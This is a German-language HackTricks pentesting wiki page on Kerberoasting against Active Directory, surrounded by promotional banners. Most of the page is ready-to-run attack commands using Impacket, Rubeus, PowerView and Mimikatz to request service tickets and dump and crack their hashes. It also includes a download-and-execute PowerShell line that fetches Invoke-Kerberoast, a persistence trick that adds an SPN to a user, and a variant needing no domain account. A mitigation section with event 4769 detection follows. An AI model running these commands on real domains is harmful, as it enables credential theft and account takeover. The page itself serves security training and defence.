# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Kerberoast

Kerberoasting konzentriert sich auf den Erwerb von **TGS-Tickets**, insbesondere solche, die mit Diensten unter **Benutzerkonten** in **Active Directory (AD)** arbeiten, mit Ausnahme von **Computerkonten**. Die Verschlüsselung dieser Tickets verwendet Schlüssel, die aus **Benutzerpasswörtern** stammen und somit die Möglichkeit des **Offline-Knackens von Anmeldeinformationen** eröffnen. Die Verwendung eines Benutzerkontos als Dienst wird durch eine nicht leere **"ServicePrincipalName"**-Eigenschaft angezeigt.

Für die Ausführung von **Kerberoasting** ist ein Domänenkonto erforderlich, das in der Lage ist, **TGS-Tickets** anzufordern. Dieser Prozess erfordert jedoch keine **besonderen Berechtigungen** und ist somit für jeden mit **gültigen Domänenanmeldeinformationen** zugänglich.

### Schlüsselpunkte:
- **Kerberoasting** zielt auf **TGS-Tickets** für **Dienste unter Benutzerkonten** in **AD** ab.
- Mit Schlüsseln aus **Benutzerpasswörtern** verschlüsselte Tickets können **offline geknackt** werden.
- Ein Dienst wird durch einen nicht leeren **ServicePrincipalName** identifiziert.
- Es sind **keine besonderen Berechtigungen** erforderlich, nur **gültige Domänenanmeldeinformationen**.

### **Angriff**

{% hint style="warning" %}
**Kerberoasting-Tools** fordern in der Regel **`RC4-Verschlüsselung`** an, wenn sie den Angriff durchführen und TGS-REQ-Anfragen initiieren. Dies liegt daran, dass **RC4** [**schwächer**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) ist und mit Tools wie Hashcat offline leichter zu knacken ist als andere Verschlüsselungsalgorithmen wie AES-128 und AES-256.\
RC4-Hashes (Typ 23) beginnen mit **`$krb5tgs$23$*`**, während AES-256 (Typ 18) mit **`$krb5tgs$18$*`** beginnen.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Mehrfunktionswerkzeuge, einschließlich einer Auflistung von kerberoastbaren Benutzern:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Ermittle Kerberoastable-Benutzer**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technik 1: Fordere TGS an und speichere es im Speicher ab**

Um den Kerberos-Ticket-Granting-Service (TGS) zu erhalten und ihn aus dem Speicher abzurufen, können folgende Schritte unternommen werden: 

1. Identifiziere ein Konto im Active Directory, das für den Zugriff auf den TGS berechtigt ist.
2. Fordere ein TGS-Ticket für das identifizierte Konto an.
3. Extrahiere das TGS-Ticket aus dem Speicher des Zielcomputers.
4. Analysiere das extrahierte TGS-Ticket, um sensible Informationen wie den Service Account Name und den Service Principal Name (SPN) zu erhalten.

Diese Technik ermöglicht es einem Angreifer, TGS-Tickets zu sammeln und sie offline zu knacken, um Zugriff auf Dienste zu erhalten, für die das TGS-Ticket ausgestellt wurde.
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technik 2: Automatische Tools**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Wenn ein TGS angefordert wird, wird das Windows-Ereignis `4769 - Ein Kerberos-Dienstticket wurde angefordert` generiert.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Knacken
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistenz

Wenn Sie **ausreichende Berechtigungen** für einen Benutzer haben, können Sie ihn **kerberoastbar** machen:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Sie finden nützliche **Tools** für **Kerberoast**-Angriffe hier: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Wenn Sie diesen **Fehler** unter Linux finden: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Uhrabweichung zu groß)`**, liegt dies an Ihrer lokalen Zeit. Sie müssen den Host mit dem DC synchronisieren. Es gibt einige Optionen:

* `ntpdate <IP des DC>` - Veraltet ab Ubuntu 16.04
* `rdate -n <IP des DC>`

### Abhilfe

Kerberoasting kann mit einem hohen Maß an Heimlichkeit durchgeführt werden, wenn es ausnutzbar ist. Um diese Aktivität zu erkennen, sollte besondere Aufmerksamkeit auf **Security Event ID 4769** gelegt werden, die anzeigt, dass ein Kerberos-Ticket angefordert wurde. Aufgrund der hohen Häufigkeit dieses Ereignisses müssen jedoch spezifische Filter angewendet werden, um verdächtige Aktivitäten zu isolieren:

- Der Dienstname sollte nicht **krbtgt** sein, da dies eine normale Anfrage ist.
- Dienstnamen, die mit **$** enden, sollten ausgeschlossen werden, um Maschinenkonten für Dienste nicht einzubeziehen.
- Anfragen von Maschinen sollten durch das Ausschließen von Kontonamen im Format **machine@domain** herausgefiltert werden.
- Es sollten nur erfolgreiche Ticketanfragen berücksichtigt werden, die durch einen Fehlercode von **'0x0'** identifiziert werden.
- **Am wichtigsten ist**, dass der Verschlüsselungstyp des Tickets **0x17** sein sollte, der häufig bei Kerberoasting-Angriffen verwendet wird.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Um das Risiko von Kerberoasting zu minimieren:

- Stellen Sie sicher, dass **Service Account-Passwörter schwer zu erraten** sind und empfehlen Sie eine Länge von mehr als **25 Zeichen**.
- Verwenden Sie **Managed Service Accounts**, die Vorteile wie **automatische Passwortänderungen** und **delegiertes Service Principal Name (SPN) Management** bieten und die Sicherheit gegen solche Angriffe erhöhen.

Durch die Umsetzung dieser Maßnahmen können Organisationen das mit Kerberoasting verbundene Risiko erheblich reduzieren.


## Kerberoast ohne Domänenkonto

Im **September 2022** wurde eine neue Methode zur Ausnutzung eines Systems von einem Forscher namens Charlie Clark aufgedeckt und über seine Plattform [exploit.ph](https://exploit.ph/) geteilt. Diese Methode ermöglicht den Erwerb von **Service Tickets (ST)** über eine **KRB_AS_REQ**-Anfrage, die erstaunlicherweise keine Kontrolle über ein Active Directory-Konto erfordert. Im Wesentlichen kann, wenn ein Prinzipal so eingerichtet ist, dass keine Vorauthentifizierung erforderlich ist - eine Situation, die in der Cybersicherheitswelt als **AS-REP Roasting-Angriff** bekannt ist - diese Eigenschaft genutzt werden, um den Anfrageprozess zu manipulieren. Konkret wird durch Ändern des **sname**-Attributs im Anfragekörper das System dazu verleitet, anstelle des standardmäßig verschlüsselten Ticket Granting Ticket (TGT) ein **ST** auszustellen.

Die Technik wird in diesem Artikel ausführlich erläutert: [Semperis Blog-Beitrag](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Sie müssen eine Liste von Benutzern bereitstellen, da wir kein gültiges Konto haben, um die LDAP-Abfrage mit dieser Technik durchzuführen.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py aus PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus aus PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referenzen
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
